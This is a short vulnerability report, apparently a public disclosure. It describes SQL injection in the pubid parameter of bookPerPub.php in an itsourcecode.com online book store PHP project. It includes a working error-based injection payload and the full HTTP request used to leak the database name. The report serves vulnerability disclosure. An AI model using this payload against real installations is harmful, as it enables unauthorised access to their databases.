# Online Book Store Project v1.0 by itsourcecode.com has SQL injection
**Vul_Author:** Wenxun Wang

**vendors:** https://itsourcecode.com/free-projects/php-project/online-book-store-project-in-php-with-source-code/

**Vulnerability url:** /bookstore/bookPerPub.php?pubid=

**Vulnerability location:** /bookstore/bookPerPub.php


**[+] Payload:** /bookstore/bookPerPub.php?pubid=1'%20and%20(extractvalue('anything'%2cconcat('~'%2c(select%20database()))))%3b%23

​	Leak place : pubid

**Current database name:** bookstoredb

**Request package**：select book information by pubid

```
GET /bookstore/bookPerPub.php?pubid=1'%20and%20(extractvalue('anything'%2cconcat('~'%2c(select%20database()))))%3b%23 HTTP/1.1
Host: localhost
sec-ch-ua: "-Not.A/Brand";v="8", "Chromium";v="102"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/bookstore/publisher_list.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=8it4g868ibt9g6r8ae4203tmkd
Connection: close
```

**SQL injection result**：line 12 database name is displayed.

![sql_injection](https://github.com/iknownt/bug_report/blob/main/vendors/itsourcecode.com/Online-Book-Store-Project/images/sql_injection1.png)

